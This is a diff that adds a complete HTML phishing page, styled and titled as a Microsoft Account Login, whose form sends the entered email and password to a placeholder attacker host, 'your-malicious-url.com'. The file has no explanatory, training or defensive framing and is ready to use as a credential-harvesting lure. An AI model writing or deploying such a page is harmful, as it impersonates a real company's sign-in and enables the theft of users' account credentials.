@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Account Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0px 0px 5px 1px #ccc;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            height: 35px;
+            padding: 5px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            height: 35px;
+            background-color: #0072c6;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Microsoft Account Login</h1>
+    <p>Please enter your email and password to sign in.</p>
+    <form action="https://your-malicious-url.com/login" method="post">
+        <input type="text" name="username" placeholder="Email or phone" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <input type="submit" value="Sign in" />
+    </form>
+</body>
+</html>
